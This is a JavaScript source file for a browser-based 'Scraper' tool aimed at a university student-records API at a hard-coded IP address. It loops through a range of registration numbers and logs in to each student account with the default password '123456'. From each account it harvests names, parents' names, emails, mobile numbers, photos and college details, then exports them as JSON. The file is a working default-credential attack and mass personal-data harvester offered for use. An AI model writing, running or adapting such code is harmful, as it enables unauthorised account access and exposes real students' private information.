class Scraper {
    constructor() {
        // Check authentication first
        const currentUser = JSON.parse(localStorage.getItem('currentUser') || sessionStorage.getItem('currentUser'));
        if (!currentUser) {
            window.location.href = 'login.html';
            return;
        }

        this.isRunning = false;
        this.shouldStop = false;
        this.startTime = null;
        this.timer = null;
        this.scrapedData = [];
        this.currentIndex = 0;
        this.successCount = 0;
        this.failCount = 0;
        this.accessToken = null;
        this.currentUser = currentUser; // Store user info for activity logging

        this.init();
        this.setupEventListeners();
    }

    init() {
        // Initialize delay slider
        const delayRange = document.getElementById('delayRange');
        const delayValue = document.getElementById('delayValue');
        if (delayRange && delayValue) {
            delayRange.addEventListener('input', (e) => {
                delayValue.textContent = `${e.target.value}ms`;
            });
        }

        // Initialize form validation
        this.setupValidation();
    }

    setupEventListeners() {
        // Form submission
        const form = document.getElementById('scrapeForm');
        if (form) {
            form.addEventListener('submit', (e) => this.handleSubmit(e));
        }

        // Stop button
        const stopButton = document.getElementById('stopScrape');
        if (stopButton) {
            stopButton.addEventListener('click', () => this.handleStop());
        }

        // Download button
        const downloadButton = document.getElementById('downloadData');
        if (downloadButton) {
            downloadButton.addEventListener('click', () => this.handleDownload());
        }

        // Clear log button
        const clearLogButton = document.getElementById('clearLog');
        if (clearLogButton) {
            clearLogButton.addEventListener('click', () => this.clearLog());
        }

        // Modal close buttons
        document.querySelectorAll('.close').forEach(button => {
            button.addEventListener('click', () => this.hideModal());
        });

        // Cancel action button
        const cancelButton = document.getElementById('cancelAction');
        if (cancelButton) {
            cancelButton.addEventListener('click', () => this.hideModal());
        }
    }

    setupValidation() {
        // Registration number validation
        const regInputs = ['startReg', 'endReg'];
        regInputs.forEach(id => {
            const input = document.getElementById(id);
            if (input) {
                input.addEventListener('input', (e) => {
                    const value = e.target.value;
                    const isValid = /^\d{11}$/.test(value);
                    this.validateField(input, isValid, 'Registration number must be 11 digits');
                });
            }
        });

        // Filename validation
        const filenameInput = document.getElementById('outputFile');
        if (filenameInput) {
            filenameInput.addEventListener('input', (e) => {
                const value = e.target.value;
                const isValid = /^[A-Za-z0-9\s\-_]+$/.test(value);
                this.validateField(filenameInput, isValid, 'Only letters, numbers, spaces, hyphens, and underscores allowed');
            });
        }
    }

    validateField(input, isValid, errorMessage) {
        const validationMessage = input.nextElementSibling;
        if (validationMessage && validationMessage.classList.contains('validation-message')) {
            if (!isValid) {
                input.classList.add('error');
                validationMessage.textContent = errorMessage;
            } else {
                input.classList.remove('error');
                validationMessage.textContent = '';
            }
        }
        return isValid;
    }

    async handleSubmit(e) {
        e.preventDefault();
        
        // Validate form
        const startReg = document.getElementById('startReg').value;
        const endReg = document.getElementById('endReg').value;
        const outputFile = document.getElementById('outputFile').value;

        const validations = [
            this.validateField(document.getElementById('startReg'), /^\d{11}$/.test(startReg), 'Registration number must be 11 digits'),
            this.validateField(document.getElementById('endReg'), /^\d{11}$/.test(endReg), 'Registration number must be 11 digits'),
            this.validateField(document.getElementById('outputFile'), /^[A-Za-z0-9\s\-_]+$/.test(outputFile), 'Invalid filename')
        ];

        if (!validations.every(Boolean)) {
            this.showAlert('Please fill all fields correctly', 'error');
            return;
        }

        if (parseInt(startReg) >= parseInt(endReg)) {
            this.showAlert('Start registration number must be less than end registration number', 'error');
            return;
        }

        // Show confirmation modal
        this.showConfirmModal(
            'Start Scraping',
            `Are you sure you want to start scraping from ${startReg} to ${endReg}?`,
            () => this.startScraping(startReg, endReg, outputFile)
        );
    }

    async startScraping(startReg, endReg, outputFile) {
        this.isRunning = true;
        this.shouldStop = false;
        this.scrapedData = [];
        this.currentIndex = parseInt(startReg);
        this.successCount = 0;
        this.failCount = 0;
        this.startTime = new Date();

        // Update UI
        this.updateUIState(true);
        this.showProgress();
        this.startTimer();
        this.addLogEntry('Starting scraping process...', 'info');

        const delay = parseInt(document.getElementById('delayRange').value);
        const filterEconomics = document.getElementById('filterEconomics').checked;

        try {
            while (this.currentIndex <= parseInt(endReg) && !this.shouldStop) {
                await this.scrapeRegistration(this.currentIndex, filterEconomics);
                this.currentIndex++;
                this.updateProgress(startReg, endReg);
                await this.sleep(delay);
            }

            if (!this.shouldStop) {
                this.addLogEntry('Scraping completed successfully!', 'success');
                this.handleDownload(); // Automatically download when complete
            } else {
                this.addLogEntry('Scraping stopped by user', 'info');
            }

        } catch (error) {
            this.addLogEntry(`Error: ${error.message}`, 'error');
            console.error('Scraping error:', error);
        } finally {
            this.isRunning = false;
            this.updateUIState(false);
            this.stopTimer();
        }
    }

    async login(username, password) {
        try {
            const response = await fetch("http://103.113.200.46:8006/api/student/login", {
                method: "POST",
                headers: {
                    "accept": "application/json, text/plain, */*",
                    "accept-language": "en-US,en;q=0.8",
                    "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
                    "sec-gpc": "1",
                    "Referer": "http://ems.nu.ac.bd/",
                    "Referrer-Policy": "strict-origin-when-cross-origin"
                },
                body: `username=${username}&password=${password}&recaptcha-v3=undefined`
            });

            if (!response.ok) {
                throw new Error(`Login failed: ${response.status}`);
            }

            const data = await response.json();
            this.accessToken = data.access_token;
            return true;
        } catch (error) {
            console.error('Login error:', error);
            this.addLogEntry(`Login failed: ${error.message}`, 'error');
            return false;
        }
    }

    async scrapeRegistration(regNumber, filterEconomics) {
        try {
            // Add user info to activity log
            const activityLog = JSON.parse(localStorage.getItem('activities') || '[]');
            activityLog.unshift({
                type: 'info',
                message: 'Started scraping student data',
                details: `Registration: ${regNumber}, User: ${this.currentUser.email}`,
                time: new Date().toLocaleString()
            });
            localStorage.setItem('activities', JSON.stringify(activityLog.slice(0, 100)));

            if (!this.accessToken) {
                // Try to login with default credentials
                const loggedIn = await this.login(regNumber, '123456');
                if (!loggedIn) {
                    throw new Error('Authentication failed');
                }
            }

            const response = await fetch("http://103.113.200.46:8006/api/student/login", {
                method: "POST",
                headers: {
                    "accept": "application/json, text/plain, */*",
                    "accept-language": "en-US,en;q=0.8",
                    "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
                    "sec-gpc": "1",
                    "Referer": "http://ems.nu.ac.bd/",
                    "Referrer-Policy": "strict-origin-when-cross-origin"
                },
                body: `username=${regNumber}&password=123456&recaptcha-v3=undefined`
            });

            if (!response.ok) {
                throw new Error(`HTTP error! status: ${response.status}`);
            }

            const data = await response.json();
            
            // Check if it's an Economics student
            if (filterEconomics && data.student.subject.subject_name !== 'ECONOMICS') {
                this.addLogEntry(`Skipped ${regNumber} (Not Economics)`, 'info');
                return;
            }

            // Transform the data into a more manageable format
            const studentData = {
                id: data.student.id,
                registration: data.student.reg_no,
                admission_roll: data.student.admission_roll,
                name: data.student.name,
                father_name: data.student.father_name,
                mother_name: data.student.mother_name,
                session: data.student.ac_session,
                session_expire: data.student.ac_session_expire,
                email: data.student.email,
                mobile: data.student.mobile,
                gender: data.student.gender === '1' ? 'Male' : 'Female',
                photo_url: data.student.photo_url,
                status: data.student.status === '1' ? 'Active' : 'Inactive',
                created_at: data.student.created_at,
                college: {
                    code: data.student.college.college_code,
                    name: data.student.college.college_name,
                    type: data.student.college.college_type,
                    management: data.student.college.mgt_type,
                    email: data.student.college.email,
                    mobile: data.student.college.mobile,
                    address: data.student.college.address,
                    district: data.student.college.districts.district_name,
                    division: data.student.college.division
                },
                degree: {
                    code: data.student.degree.degree_code,
                    name: data.student.degree.degree_name
                },
                degree_group: {
                    code: data.student.degree_group.degree_group_code,
                    name: data.student.degree_group.degree_group_name
                },
                subject: {
                    code: data.student.subject.subject_code,
                    name: data.student.subject.subject_name
                },
                student_type: data.student.student_types.student_type,
                scraped_at: new Date().toISOString()
            };

            // Store in local storage
            const students = JSON.parse(localStorage.getItem('students') || '[]');
            const existingIndex = students.findIndex(s => s.registration === studentData.registration);
            
            if (existingIndex !== -1) {
                students[existingIndex] = studentData;
            } else {
                students.push(studentData);
            }
            
            localStorage.setItem('students', JSON.stringify(students));

            // Add to scraped data
            this.scrapedData.push(studentData);
            this.successCount++;
            this.addLogEntry(`Successfully scraped ${regNumber}`, 'success');

            // Add to activity log
            const activities = JSON.parse(localStorage.getItem('activities') || '[]');
            activities.unshift({
                type: 'success',
                message: `Updated student data for ${studentData.name}`,
                details: `Registration: ${studentData.registration}`,
                time: new Date().toLocaleString()
            });
            localStorage.setItem('activities', JSON.stringify(activities.slice(0, 100))); // Keep last 100 activities

        } catch (error) {
            this.failCount++;
            this.addLogEntry(`Failed to scrape ${regNumber}: ${error.message}`, 'error');
            
            // Add to activity log with user info
            const errorLog = JSON.parse(localStorage.getItem('activities') || '[]');
            errorLog.unshift({
                type: 'error',
                message: 'Failed to scrape student data',
                details: `Registration: ${regNumber}, User: ${this.currentUser.email}, Error: ${error.message}`,
                time: new Date().toLocaleString()
            });
            localStorage.setItem('activities', JSON.stringify(errorLog.slice(0, 100)));
        }
    }

    updateProgress(startReg, endReg) {
        const total = parseInt(endReg) - parseInt(startReg) + 1;
        const current = this.currentIndex - parseInt(startReg);
        const percentage = Math.round((current / total) * 100);

        // Update progress bar
        const progressFill = document.querySelector('.progress-fill');
        if (progressFill) {
            progressFill.style.width = `${percentage}%`;
        }

        // Update percentage text
        const progressPercentage = document.querySelector('.progress-percentage');
        if (progressPercentage) {
            progressPercentage.textContent = `${percentage}%`;
        }

        // Update status
        const progressStatus = document.querySelector('.progress-status');
        if (progressStatus) {
            progressStatus.textContent = `Processing registration number: ${this.currentIndex}`;
        }

        // Update stats
        document.getElementById('successCount').textContent = this.successCount;
        document.getElementById('failCount').textContent = this.failCount;
    }

    startTimer() {
        this.timer = setInterval(() => {
            const elapsed = new Date() - this.startTime;
            const hours = Math.floor(elapsed / 3600000);
            const minutes = Math.floor((elapsed % 3600000) / 60000);
            const seconds = Math.floor((elapsed % 60000) / 1000);
            document.getElementById('timeElapsed').textContent = 
                `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
        }, 1000);
    }

    stopTimer() {
        if (this.timer) {
            clearInterval(this.timer);
            this.timer = null;
        }
    }

    updateUIState(isRunning) {
        const startButton = document.getElementById('startScrape');
        const stopButton = document.getElementById('stopScrape');
        const downloadButton = document.getElementById('downloadData');
        const form = document.getElementById('scrapeForm');

        if (startButton) startButton.disabled = isRunning;
        if (stopButton) stopButton.disabled = !isRunning;
        if (downloadButton) downloadButton.disabled = isRunning || this.scrapedData.length === 0;
        if (form) {
            Array.from(form.elements).forEach(element => {
                if (element.type !== 'button') {
                    element.disabled = isRunning;
                }
            });
        }
    }

    showProgress() {
        const progressContainer = document.querySelector('.progress-container');
        if (progressContainer) {
            progressContainer.style.display = 'block';
        }
    }

    handleStop() {
        this.showConfirmModal(
            'Stop Scraping',
            'Are you sure you want to stop the scraping process?',
            () => {
                this.shouldStop = true;
                this.addLogEntry('Stopping scraping process...', 'info');
            }
        );
    }

    handleDownload() {
        if (this.scrapedData.length === 0) {
            this.showAlert('No data to download', 'error');
            return;
        }

        const filename = document.getElementById('outputFile').value;
        const data = {
            metadata: {
                scrapedAt: new Date().toISOString(),
                totalRecords: this.scrapedData.length,
                successfulScrapes: this.successCount,
                failedScrapes: this.failCount,
                timeElapsed: document.getElementById('timeElapsed').textContent,
                apiVersion: '1.0',
                source: 'NU EMS API'
            },
            data: this.scrapedData
        };

        const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `${filename}.json`;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);

        this.addLogEntry('Data downloaded successfully', 'success');
    }

    addLogEntry(message, type = 'info') {
        const logContent = document.getElementById('logContent');
        if (!logContent) return;

        const entry = document.createElement('div');
        entry.className = `log-entry ${type}`;
        
        let icon;
        switch (type) {
            case 'success':
                icon = 'fa-check-circle';
                break;
            case 'error':
                icon = 'fa-times-circle';
                break;
            default:
                icon = 'fa-info-circle';
        }

        entry.innerHTML = `
            <i class="fas ${icon}"></i>
            <span>${message}</span>
        `;

        logContent.appendChild(entry);
        logContent.scrollTop = logContent.scrollHeight;
    }

    clearLog() {
        const logContent = document.getElementById('logContent');
        if (logContent) {
            logContent.innerHTML = '';
        }
    }

    showAlert(message, type = 'info') {
        const alert = document.createElement('div');
        alert.className = `custom-alert ${type}`;
        alert.textContent = message;

        document.body.appendChild(alert);

        setTimeout(() => {
            alert.style.opacity = '0';
            setTimeout(() => alert.remove(), 300);
        }, 3000);
    }

    showConfirmModal(title, message, callback) {
        const modal = document.getElementById('confirmModal');
        const confirmMessage = document.getElementById('confirmMessage');
        const confirmButton = document.getElementById('confirmAction');

        if (modal && confirmMessage && confirmButton) {
            confirmMessage.textContent = message;
            confirmButton.onclick = () => {
                this.hideModal();
                callback();
            };
            modal.style.display = 'flex';
            setTimeout(() => modal.classList.add('show'), 10);
        }
    }

    hideModal() {
        const modal = document.getElementById('confirmModal');
        if (modal) {
            modal.classList.remove('show');
            setTimeout(() => modal.style.display = 'none', 300);
        }
    }

    sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
}

// Initialize scraper when DOM is loaded
document.addEventListener('DOMContentLoaded', () => {
    // Check authentication before initializing
    const currentUser = JSON.parse(localStorage.getItem('currentUser') || sessionStorage.getItem('currentUser'));
    if (!currentUser) {
        window.location.href = 'login.html';
        return;
    }
    new Scraper();
}); 